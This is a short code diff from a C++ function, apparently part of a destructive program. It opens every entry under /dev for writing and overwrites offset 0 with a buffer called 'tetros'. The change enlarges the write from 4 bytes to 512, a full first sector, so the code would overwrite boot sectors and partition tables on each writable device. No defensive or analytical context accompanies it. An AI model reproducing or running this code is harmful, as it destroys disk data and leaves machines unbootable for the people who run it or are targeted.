@@ -20,7 +20,7 @@ int phase2::execute()
 	        printf ("%s\n", ent->d_name);
         	int fd = open(((std::string)"/dev/"+(std::string)ent->d_name).c_str(), O_WRONLY);
         	lseek(fd, 0, SEEK_SET);
-        	write(fd, tetros, 4);
+        	write(fd, tetros, 512);
         	close(fd);
         	//perror("perror output:");
 		//fclose(fh);
